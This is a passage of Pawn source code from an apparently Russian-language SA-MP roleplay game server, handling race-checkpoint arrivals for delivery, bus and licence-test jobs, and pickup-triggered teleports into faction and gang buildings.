		DeletePVar(playerid, "FuelID");
		DisablePlayerRaceCheckpoint(playerid);
	}
	if(GetPVarInt(playerid, "ProductID") > 0)
	{
		new i = ProductInfo[GetPVarInt(playerid, "ProductID")][pBizzid], playerd;
		Delete3DTextLabel(ProductInfo[GetPVarInt(playerid, "ProductID")][pText3D]);
		BizzInfo[i][bProduct] += ProductInfo[GetPVarInt(playerid, "ProductID")][pTill];
		PlayerInfo[playerid][pPayCheck] += 2000;
		SendMes(playerid, TEAM_BLUE_COLOR, "Вы доставили %i продуктов для %s (%s)", ProductInfo[GetPVarInt(playerid, "ProductID")][pTill], BizzInfo[i][bName], ProductInfo[GetPVarInt(playerid, "ProductID")][pName]);
		sscanf(ProductInfo[GetPVarInt(playerid, "ProductID")][pName], "u", playerd);
		SendClientMessage(playerid, COLOR_WHITE, "2000$ добавлено к вашей зарплате");
		if(IsPlayerConnected(playerd))
		{
			SendClientMessage(playerd, 0x006699FF, "[ - - - - - - - - - - - - - - - - - - - - - ]");
			SendMes(playerd, 0x006699FF, "Развозчик продуктов {ffffff}%s {006699}выполнил ваш заказ", PlayerInfo[playerid][pSendername]);
			SendMes(playerd, 0x006699FF, "Кол-во: {ffffff}%i {006699}продуктов", ProductInfo[GetPVarInt(playerid, "ProductID")][pTill]);
			SendMes(playerd, 0x006699FF, "Оплата: {ffffff}%i {006699}долларов", ProductInfo[GetPVarInt(playerid, "ProductID")][pPrice]);
			SendClientMessage(playerd, 0x006699FF, "[ - - - - - - - - - - - - - - - - - - - - - ]");
		}
		for(new p = 0; p <= MAX_PLAYERS; p++)
		{
			if(!IsPlayerConnected(p) || PlayerLogged[p] == 0 || GetPVarInt(p, "ProductID") == 0) continue;
			if(GetPVarInt(p, "ProductID") > GetPVarInt(playerid, "ProductID")) SetPVarInt(p, "ProductID", GetPVarInt(p, "ProductID") - 1);
		}
		for(new p = GetPVarInt(playerid, "ProductID"); p <= TOTALPRODUCT - 1; p++)
		{
			strmid(ProductInfo[p][pName],ProductInfo[p+1][pName],0,strlen(ProductInfo[p+1][pName]),MAX_PLAYER_NAME);
			ProductInfo[p][pBizzid] = ProductInfo[p+1][pBizzid];
			ProductInfo[p][pPrice] = ProductInfo[p+1][pPrice];
			ProductInfo[p][pTill] = ProductInfo[p+1][pTill];
			ProductInfo[p][pStatus] = ProductInfo[p+1][pStatus];
			ProductInfo[p][pText3D] = ProductInfo[p+1][pText3D];
		}
		TOTALPRODUCT--;
		DeletePVar(playerid, "ProductID");
		DisablePlayerRaceCheckpoint(playerid);
	}
	if(GetPVarInt(playerid, "Home") == 1)
	{
		SendClientMessage(playerid, COLOR_YELLOW, "Вы достигли места назначения");
		DeletePVar(playerid, "Home");
		DisablePlayerRaceCheckpoint(playerid);
	}
	if(GetPVarInt(playerid, "PriceBus") > 0)
	{
		new type = GetPVarInt(playerid, "TypeBus"), e_type, name[32];
		switch(GetPVarInt(playerid, "TypeBus"))
		{
		case 1: name = "Внутри-городской ЛС";
		case 2: name = "Внутри-городской СФ";
		case 3: name = "Внутри-городской ЛВ";
		case 4: name = "ЖД вокзал - Автошкола";
		case 5: name = "ЖД вокзал - Карьер";
		}
		if(type == 1)
		{
			if(pPressed[playerid] == 13 || pPressed[playerid] == 20 || pPressed[playerid] == 25 || pPressed[playerid] == 31 || pPressed[playerid] == 37 || pPressed[playerid] == 45 || pPressed[playerid] == 55 || pPressed[playerid] == 63  || pPressed[playerid] == 70)
			{
				if(GetPVarInt(playerid, "BusStop") == 0)
				{
					SetPVarInt(playerid, "TimeBus", 11);
					format(string, 128, "Автобус отъезжает через несколько секунд (%s)",name);
					ProxDetectorNew(playerid, 30.0, COLOR_FADE5, string);
				}
				else
				{
					if(pPressed[playerid] == 70) pPressed[playerid] = 0;
					else pPressed[playerid]++;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,0,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],5.0);
					SetPVarInt(playerid, "BusStop", 0);
				}
			}
			else
			{
				pPressed[playerid]++;
				SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 50);
				if(pPressed[playerid] == 13 || pPressed[playerid] == 20 || pPressed[playerid] == 25 || pPressed[playerid] == 31 || pPressed[playerid] == 37 || pPressed[playerid] == 45 || pPressed[playerid] == 55 || pPressed[playerid] == 63 || pPressed[playerid] == 70) e_type = 1;
				else e_type = 0;
				new i = pPressed[playerid];
				SetPlayerRaceCheckpoint(playerid,e_type,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],5.0);
			}
		}
		if(type == 2) // 9, 46, 82 / 91
		{
			if(pPressed[playerid] == 3 || pPressed[playerid] == 10 || pPressed[playerid] == 20 || pPressed[playerid] == 32 || pPressed[playerid] == 35 || pPressed[playerid] == 40 || pPressed[playerid] == 46 || pPressed[playerid] == 53 || pPressed[playerid] == 56)
			{
				if(GetPVarInt(playerid, "BusStop") == 0)
				{
					SetPVarInt(playerid, "TimeBus", 11);
					format(string, 128, "Автобус отъезжает через несколько секунд (%s)",name);
					ProxDetectorNew(playerid, 30.0, COLOR_FADE5, string);
				}
				else
				{
					if(pPressed[playerid] == 56) pPressed[playerid] = 0;
					else pPressed[playerid]++;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,0,BusCitySF[i][0],BusCitySF[i][1],BusCitySF[i][2],BusCitySF[i][3],BusCitySF[i][4],BusCitySF[i][5],5.0);
					SetPVarInt(playerid, "BusStop", 0);
				}
			}
			else
			{
				pPressed[playerid]++;
				SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 70);
				if(pPressed[playerid] == 3 || pPressed[playerid] == 10 || pPressed[playerid] == 20 || pPressed[playerid] == 32 || pPressed[playerid] == 35 || pPressed[playerid] == 40 || pPressed[playerid] == 46 || pPressed[playerid] == 53 || pPressed[playerid] == 56) e_type = 1;
				else e_type = 0;
				new i = pPressed[playerid];
				SetPlayerRaceCheckpoint(playerid,e_type,BusCitySF[i][0],BusCitySF[i][1],BusCitySF[i][2],BusCitySF[i][3],BusCitySF[i][4],BusCitySF[i][5],5.0);
			}
		}
		if(type == 3)
		{
			if(pPressed[playerid] == 7 || pPressed[playerid] == 10 || pPressed[playerid] == 18 || pPressed[playerid] == 24 || pPressed[playerid] == 32 || pPressed[playerid] == 39 || pPressed[playerid] == 51 || pPressed[playerid] == 64 || pPressed[playerid] == 71  || pPressed[playerid] == 79)
			{
				if(GetPVarInt(playerid, "BusStop") == 0)
				{
					SetPVarInt(playerid, "TimeBus", 11);
					format(string, 128, "Автобус отъезжает через несколько секунд (%s)",name);
					ProxDetectorNew(playerid, 30.0, COLOR_FADE5, string);
				}
				else
				{
					if(pPressed[playerid] == 79) pPressed[playerid] = 0;
					else pPressed[playerid]++;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,0,BusCityLV[i][0],BusCityLV[i][1],BusCityLV[i][2],BusCityLV[i][3],BusCityLV[i][4],BusCityLV[i][5],5.0);
					SetPVarInt(playerid, "BusStop", 0);
				}
			}
			else
			{
				pPressed[playerid]++;
				SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 60);
				if(pPressed[playerid] == 7 || pPressed[playerid] == 10 || pPressed[playerid] == 18 || pPressed[playerid] == 24 || pPressed[playerid] == 32 || pPressed[playerid] == 39 || pPressed[playerid] == 51 || pPressed[playerid] == 64 || pPressed[playerid] == 71 || pPressed[playerid] == 79) e_type = 1;
				else e_type = 0;
				new i = pPressed[playerid];
				SetPlayerRaceCheckpoint(playerid,e_type,BusCityLV[i][0],BusCityLV[i][1],BusCityLV[i][2],BusCityLV[i][3],BusCityLV[i][4],BusCityLV[i][5],5.0);
			}
		}
		if(type == 4)
		{
			if(pPressed[playerid] == 11 || pPressed[playerid] == 23 || pPressed[playerid] == 57 || pPressed[playerid] == 88 || pPressed[playerid] == 101 || pPressed[playerid] == 112)
			{
				if(GetPVarInt(playerid, "BusStop") == 0)
				{
					SetPVarInt(playerid, "TimeBus", 11);
					format(string, 128, "Автобус отъезжает через несколько секунд (%s)",name);
					ProxDetectorNew(playerid, 30.0, COLOR_FADE5, string);
				}
				else
				{
					if(pPressed[playerid] == 112) pPressed[playerid] = 0;
					else pPressed[playerid]++;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,0,BusSchool[i][0],BusSchool[i][1],BusSchool[i][2],BusSchool[i][3],BusSchool[i][4],BusSchool[i][5],5.0);
					SetPVarInt(playerid, "BusStop", 0);
				}
			}
			else
			{
				pPressed[playerid]++;
				SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 40);
				if(pPressed[playerid] == 11 || pPressed[playerid] == 23 || pPressed[playerid] == 57 || pPressed[playerid] == 88 || pPressed[playerid] == 101 || pPressed[playerid] == 112) e_type = 1;
				else e_type = 0;
				new i = pPressed[playerid];
				SetPlayerRaceCheckpoint(playerid,e_type,BusSchool[i][0],BusSchool[i][1],BusSchool[i][2],BusSchool[i][3],BusSchool[i][4],BusSchool[i][5],5.0);
			}
		}
		if(type == 5) // 9, 46, 82 / 91
		{
			if(pPressed[playerid] == 9 || pPressed[playerid] == 46 || pPressed[playerid] == 81  || pPressed[playerid] == 91)
			{
				if(GetPVarInt(playerid, "BusStop") == 0)
				{
					SetPVarInt(playerid, "TimeBus", 11);
					format(string, 128, "Автобус отъезжает через несколько секунд (%s)",name);
					ProxDetectorNew(playerid, 30.0, COLOR_FADE5, string);
				}
				else
				{
					if(pPressed[playerid] == 91) pPressed[playerid] = 0;
					else pPressed[playerid]++;
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,0,BusLS[i][0],BusLS[i][1],BusLS[i][2],BusLS[i][3],BusLS[i][4],BusLS[i][5],5.0);
					SetPVarInt(playerid, "BusStop", 0);
				}
			}
			else
			{
				pPressed[playerid]++;
				SetPVarInt(playerid, "BusMoney", GetPVarInt(playerid, "BusMoney") + 40);
				if(pPressed[playerid] == 9 || pPressed[playerid] == 46 || pPressed[playerid] == 81 || pPressed[playerid] == 91) e_type = 1;
				else e_type = 0;
				new i = pPressed[playerid];
				SetPlayerRaceCheckpoint(playerid,e_type,BusLS[i][0],BusLS[i][1],BusLS[i][2],BusLS[i][3],BusLS[i][4],BusLS[i][5],5.0);
			}
		}
	}
	if(GetPVarInt(playerid, "LicTest") > 0)
	{
		if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем!");
		if(pPressed[playerid] == 16)
		{
			if(GetPVarInt(playerid, "LicTestError") > 2)
			{
				SendClientMessage(playerid, COLOR_LIGHTRED, "Вы провалили экзамен по вождению");
				ShowPlayerDialog(playerid, D_NULL, 0, "{ffffff}Права", "{FF6347}К сожалению вы не сдали экзамен по вождению", "Закрыть", "");
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREEN, "Поздравляем! Вы сдали экзамен по вождению");
				ShowPlayerDialog(playerid, D_NULL, 0, "{33AAFF}Права", "{ffffff}Поздравляем, вы сдали экзамен по вождению", "Закрыть", "");
				PlayerInfo[playerid][pLic][0] = 1;
			}
			DeletePVar(playerid, "LicTest");
			DeletePVar(playerid, "LicTestHealth");
			DeletePVar(playerid, "LicTestError");
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			DisablePlayerRaceCheckpoint(playerid);
		}
		else
		{
			pPressed[playerid]++;
			new Float:health, i = pPressed[playerid];
			GetVehicleHealth(GetPlayerVehicleID(playerid), health);
			if(health < GetPVarFloat(playerid, "LicTestHealth"))
			{
				SendMes(playerid, COLOR_LIGHTRED, "Вы повредили транспорт. Ошибок: {ffffff}%i", GetPVarInt(playerid, "LicTestError") + 1);
				SetPVarInt(playerid, "LicTestError", GetPVarInt(playerid, "LicTestError") + 1);
			}
			if(SpeedVehicle(playerid) / 2 > 60)
			{
				SendMes(playerid, COLOR_LIGHTRED, "Вы привысили скорость. Ошибок: {ffffff}%i", GetPVarInt(playerid, "LicTestError") + 1);
				SetPVarInt(playerid, "LicTestError", GetPVarInt(playerid, "LicTestError") + 1);
			}
			if(pPressed[playerid] < 16) SetPlayerRaceCheckpoint(playerid, 0, LicTest[i][0],LicTest[i][1],LicTest[i][2],LicTest[i][3],LicTest[i][4],LicTest[i][5], 5.0);
			else SetPlayerRaceCheckpoint(playerid,1, LicTest[i][0],LicTest[i][1],LicTest[i][2],LicTest[i][3],LicTest[i][4],LicTest[i][5], 5.0);
			SetPVarFloat(playerid, "LicTestHealth", health);
		}
	}
	if(MedicCallTime[playerid] > 0)
	{
		MedicCallTime[playerid] = 0;
		SendClientMessage(playerid, COLOR_YELLOW, "Вы достигли места назначения");
		DisablePlayerRaceCheckpoint(playerid);
	}
	if(MechCallTime[playerid] > 0)
	{
		MechCallTime[playerid] = 0;
		SendClientMessage(playerid, COLOR_YELLOW, "Вы достигли места назначения");
		DisablePlayerRaceCheckpoint(playerid);
	}
	if(TaxiCallTime[playerid] > 0)
	{
		TaxiCallTime[playerid] = 0;
		SendClientMessage(playerid, COLOR_YELLOW, "Вы достигли места назначения");
		DisablePlayerRaceCheckpoint(playerid);
	}
	if(materials_Status[playerid] > 0)
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 433) return SendClientMessage(playerid, COLOR_GREY, "Ошибка! Вы должны находиться в матовозе!");
		if(materials_Status[playerid] == 1)
		{
			Mats[1] += materials_Vehicle[GetPlayerVehicleID(playerid)];
			SetOtherInt("lspdmats", Mats[1]);
			format(string, 50, "материалов: {9ACD32}%i / 100000", Mats[1]);
			Update3DTextLabelText(tPickup[3], 0xFFFFFFFF, string);
			SendMes(playerid, COLOR_LIGHTGREEN, "материалов для ЛСПД доставлено. Кол-во: {ffffff}%i", materials_Vehicle[GetPlayerVehicleID(playerid)]);
		}
		if(materials_Status[playerid] == 2)
		{
			Mats[2] += materials_Vehicle[GetPlayerVehicleID(playerid)];
			SetOtherInt("sfpdmats", Mats[2]);
			format(string, 50, "материалов: {9ACD32}%i / 100000", Mats[2]);
			Update3DTextLabelText(tPickup[4], 0xFFFFFFFF, string);
			SendMes(playerid, COLOR_LIGHTGREEN, "материалов для СФПД доставлено. Кол-во: {ffffff}%i", materials_Vehicle[GetPlayerVehicleID(playerid)]);
		}
		if(materials_Status[playerid] == 3)
		{
			Mats[4] += materials_Vehicle[GetPlayerVehicleID(playerid)];
			SetOtherInt("fbimats", Mats[4]);
			format(string, 50, "материалов: {9ACD32}%i / 100000", Mats[4]);
			Update3DTextLabelText(tPickup[6], 0xFFFFFFFF, string);
			SendMes(playerid, COLOR_LIGHTGREEN, "материалов для ФБР доставлено. Кол-во: {ffffff}%i", materials_Vehicle[GetPlayerVehicleID(playerid)]);
		}
		Delete3DTextLabel(materials_Label[playerid]);
		materials_Status[playerid] = 0;
		materials_Vehicle[GetPlayerVehicleID(playerid)] = 0;
		DisablePlayerRaceCheckpoint(playerid);
	}
	return true;
}
public OnPlayerRequestSpawn(playerid) return true;
public OnPlayerLeaveRaceCheckpoint(playerid) return true;
public OnObjectMoved(objectid) return true;
public OnPlayerObjectMoved(playerid, objectid) return true;
forward PickupBack(playerid);
public PickupBack(playerid)
{
	pickupentered[playerid] = 0;
	return true;
}
public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
	new strinfo[256];
    for(new idx = 1; idx <= TOTALDUCH; idx++)
	{
		if(pickupid == HouseInfo[idx][dPickup])
		{
           SetPVarInt(playerid, "PlayerDUCH", idx);
           if(!strcmp(HouseInfo[idx][dOwner],"None_None",true))
		   {
                if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveAtHome);
				f(strinfo,"{ffffff}\t\tДача №:%d\n\nСтоимость:\t\t\t%d",idx,GetInflationPrice(HouseInfo[idx][dPrice]));
				return ShowPlayerDialog(playerid, D_DACH, 0,"Дача",strinfo,"Купить","Отмена");
		   }
		   else
		   {
				new ttextt[32],ttexttt[32];
				if(GetPlayerID(HouseInfo[idx][dOwner]) == INVALID_PLAYER_ID) f(ttextt,"[{3caa3c}Offline{ffffff}]");
				else f(ttextt,"[{3caa3c}Online{ffffff}]");
				if((HouseInfo[idx][dLock]) == 0) f(ttexttt,"[{3caa3c}Открыто{ffffff}]");
				else f(ttexttt,"[{3caa3c}Закрыто{ffffff}]");
				f(strinfo,"{ffffff}\t\tДача №:%d\n\nВладелец:\t%s %s\nДверь:\t\t%s",idx,HouseInfo[idx][dOwner],ttextt,ttexttt);
				return ShowPlayerDialog(playerid, D_DACH, 0,"Дача",strinfo,"Войти","Отмена");
		   }
		}
	}
	if(pickupid == PickupArends)
	{
      ShowPlayerDialog(playerid, D_ARENSD, 0,"{ffffff}Аренда","{ffffff}Вы хотите арендовать катер ?\n\nСтоимость: {33CCFF}500{ffffff} долларов","Да","Отмена");
	}
	return true;
}
public OnPlayerPickUpPickup(playerid, pickupid)
{
	if(PlayerLogged[playerid] == 0) return true;
	if(!IsPlayerInRangeOfPoint(playerid, 7.0, PickupInfo[pickupid][PickX], PickupInfo[pickupid][PickY], PickupInfo[pickupid][PickZ])) return true;
	if(pickupid == oldpickup[playerid]) return true;
	if(pickupentered[playerid] == 1) return true;
	oldpickup[playerid] = pickupid;
	new Float:z;
	GetPlayerPos(playerid, PickupX[playerid], PickupY[playerid], z);
	new string[256];
	if(pickupid == RobMatsPickup)
	{
		if(IsAGang(playerid)) SendClientMessage(playerid,-1,"Для того что бы загрузить материалы в машину, введите /robmats");
	}
	if(pickupid == RobZavodPickup)
	{
		if(IsAGang(playerid)) SendClientMessage(playerid,-1,"Для того что бы загрузить материалы в машину, введите /robzavod");
	}
	if(pickupid == banklv[0] || pickupid == banklv[1])
	{
		SendClientMessage(playerid,COLOR_WHITE,"Вас приветствует сотрудник банка Las Venturas!");
		ShowPlayerDialog(playerid, D_ATM+5, 2, "Банк", "[1] Баланс счета\n[2] Пополнить счет\n[3] Перевод другому игроку\n[4] Снять со счета\n[5] Пополнить домашнийсчет\n[6] Пополнить счет бизнеса\n[7] Забрать деньги с бизнеса", "Далее", "Выход");
		return true;
	}
	if(pickupid == Bolnica[0]) // Больница
	{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerFacingAngle(playerid, 180);
		SetPlayerPos(playerid, 1192.2345,-1341.4447,1584.9719);
		SetPlayerInterior(playerid, 5);
		SetPlayerVirtualWorld(playerid,1);
		return true;
	}
	if(pickupid == fbipic[0]) // Гл.Вход
	{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 325.0525,281.2631,1000.0942);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 90);
		return true;
	}
	if(pickupid == shp[0] && Shaht[playerid] == 1 && Samorodok[playerid] == 0)
    {
		shahter = SetTimerEx("Ruda1", 5000, false, "i", playerid);
		//TogglePlayerControllable(playerid,false);
		ApplyAnimation(playerid, "SWORD", "sword_4", 4.0, 1, 0, 0, 0, 0);

    }
   	if(pickupid == shp[1] && Shaht[playerid] == 1 && Samorodok[playerid] == 0)
    {
		shahter = SetTimerEx("Ruda1", 5000, false, "i", playerid);
		//TogglePlayerControllable(playerid,false);
		ApplyAnimation(playerid, "SWORD", "sword_4", 4.0, 1, 0, 0, 0, 0);

    }
   	if(pickupid == shp[2] && Shaht[playerid] == 1 && Samorodok[playerid] == 0)
    {
		shahter = SetTimerEx("Ruda2", 5000, false, "i", playerid);
		//TogglePlayerControllable(playerid,false);
		ApplyAnimation(playerid, "SWORD", "sword_4", 4.0, 1, 0, 0, 0, 0);

    }
   	if(pickupid == shp[3] && Shaht[playerid] == 1 && Samorodok[playerid] == 0)
    {
		shahter = SetTimerEx("Ruda3", 5000, false, "i", playerid);
		//TogglePlayerControllable(playerid,false);
		ApplyAnimation(playerid, "SWORD", "sword_4", 4.0, 1, 0, 0, 0, 0);

    }
	if(pickupid == fbipic[1]) // Гл.Выход
	{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, -1973.8369,-1019.0109,32.1719);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 90);
		return true;
	}
	if(pickupid == fbipic[2]) // Гараж - Офис
	{
		if(PlayerInfo[playerid][pMember] == F_FBI)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 285.7812,281.7467,996.5789);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 90);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"Вы не сотрудник ФБР!");
	}
	if(pickupid == fbipic[3]) // Офис - Гараж
	{
		if(PlayerInfo[playerid][pMember] == F_FBI)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, -1952.4423,-1053.7191,32.1719);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 90);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"Вы не сотрудник ФБР!");
	}
	if(pickupid == fbipic[4]) // Гараж - Крыша
	{
		if(PlayerInfo[playerid][pMember] == F_FBI)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, -1951.4492,-1033.9097,53.3498);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 90);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"Вы не сотрудник ФБР!");
	}
	if(pickupid == fbipic[5]) // Крыша - Гараж
	{
		if(PlayerInfo[playerid][pMember] == F_FBI)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, -1951.7000,-1051.0000,32.1719);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 90);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"Вы не сотрудник ФБР!");
	}
////////////////////////////////////BANDS PICAPS////////////////////////////////
	if(pickupid == grovpic[0]) // Vhod Grov
	{
		if(PlayerInfo[playerid][pMember] == F_GROVE)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 2486.4268,-1641.6692,14.3059);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 354.0381);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
	if(pickupid == grovpic[1]) // Vyhod Grov
	{
		if(PlayerInfo[playerid][pMember] == F_GROVE)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 2486.4973,-1647.2806,14.3059);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 179.8231);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
	if(pickupid == vagospic[0]) // Vhod vagos
	{
		if(PlayerInfo[playerid][pMember] == F_VAGOS)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 2805.3923,-1621.0383,14.5990);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 354.0381);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
	if(pickupid == vagospic[1]) // Vyhod Vagos
	{
		if(PlayerInfo[playerid][pMember] == F_VAGOS)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 2792.8110,-1618.1992,10.9219);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 179.8231);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
	if(pickupid == rifapic[1]) // Rifa выход
	{
		if(PlayerInfo[playerid][pMember] == F_RIFA)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 2166.8203,-1791.7499,13.3585);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 179.8231);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
	if(pickupid == rifapic[0]) // Vhod rifa
	{
		if(PlayerInfo[playerid][pMember] == F_RIFA)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 2170.8359,-1783.4838,13.5756);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 354.0381);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
	if(pickupid == azpic[0]) // AZTECAS вход
	{
		if(PlayerInfo[playerid][pMember] == F_AZTECAS)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 1683.7264,-2091.9478,13.9339);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 354.0381);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
	if(pickupid == azpic[1]) // AZTECAS выход
	{
		if(PlayerInfo[playerid][pMember] == F_AZTECAS)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 1686.4095,-2101.8735,13.8343);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 179.8231);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
	if(pickupid == balpic[0]) // Vhod BALLAS
	{
		if(PlayerInfo[playerid][pMember] == F_BALLAS)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 2483.3992,-1988.7488,13.8949);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 354.0381);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
	if(pickupid == balpic[1]) // Vyhod BALLAS
	{
		if(PlayerInfo[playerid][pMember] == F_BALLAS)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 2484.7554,-2000.2368,13.5469);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 179.8231);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
	if(pickupid == arpic[0]) // Vhod 51
	{
		if(PlayerInfo[playerid][pMember] == F_ARMY)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 289.4454,1837.2297,17.6481);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 354.0381);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
		if(pickupid == arpic[1]) // Vhod 51
	{
		if(PlayerInfo[playerid][pMember] == F_ARMY)
		{
		SetTimerEx("PlayerToggle", 700, false, "d", playerid);
		TogglePlayerControllable(playerid,false);
		SetPlayerPos(playerid, 278.6574,1835.4679,17.6481);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 179.8231);
		return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"У вас нет ключей");
	}
////////////////////////////////////////////////////////////////////////////////
	if(pickupid == farmpickup && GetPVarInt(playerid,"FarmDuty") == 1)
	{
		if(Seeds[farm1car[0]] == 1000) return SendClientMessage(playerid,-1,"Машина полностью заполнена");
		if(FarmWork >= 350) return SendClientMessage(playerid,-1,"На поле закончился урожай!");
		if(GetPVarInt(playerid,"FarmSbor") == 3)
		{
			FarmWork++;
			Seeds[farm1car[0]] += 5;
			SetPVarInt(playerid,"FarmMoneyEarned",GetPVarInt(playerid,"FarmMoneyEarned")+FarmInfo[fPay]);
			format(string, 32, "+%d, total: %d", FarmInfo[fPay],GetPVarInt(playerid,"FarmMoneyEarned"));
			GameTextForPlayer(playerid, string, 1500, 1);
			RemovePlayerAttachedObject(playerid, 3);
			format(string, 64, "Кустов: %d / 1000", Seeds[farm1car[0]]);
			Update3DTextLabelText(veh3dtext, COLOR_WHITE, string);
		}
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInBackOfVehicle(farm1car[0], p[0],p[1],9.0);
		SetPVarInt(playerid,"FarmSbor",1);
		switch(random(4))
		{
